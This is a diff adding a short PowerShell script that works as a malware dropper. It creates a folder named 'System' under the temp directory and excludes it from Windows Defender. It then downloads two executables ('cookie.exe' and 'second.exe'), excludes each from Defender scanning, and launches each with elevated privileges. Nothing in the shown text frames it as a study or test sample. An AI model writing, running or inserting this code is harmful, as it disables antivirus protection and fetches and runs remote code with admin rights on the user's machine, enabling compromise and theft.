@@ -1,0 +1,22 @@
+$systemPath = [System.IO.Path]::Combine($env:temp, "System")
+New-Item -Path $systemPath -ItemType Directory -Force
+
+Add-MpPreference -ExclusionPath $systemPath
+
+$cookieUrl = "https://github.com/settings/tokens"
+$cookiePath = [System.IO.Path]::Combine($systemPath, "cookie.exe")
+
+Invoke-WebRequest -Uri $cookieUrl -OutFile $cookiePath
+
+Add-MpPreference -ExclusionProcess $cookiePath
+
+Start-Process -FilePath $cookiePath -Verb RunAs
+
+$secondUrl = "https://github.com/settings/tokens"
+$secondPath = [System.IO.Path]::Combine($systemPath, "second.exe")
+
+Invoke-WebRequest -Uri $secondUrl -OutFile $secondPath
+
+Add-MpPreference -ExclusionProcess $secondPath
+
+Start-Process -FilePath $secondPath -Verb RunAs
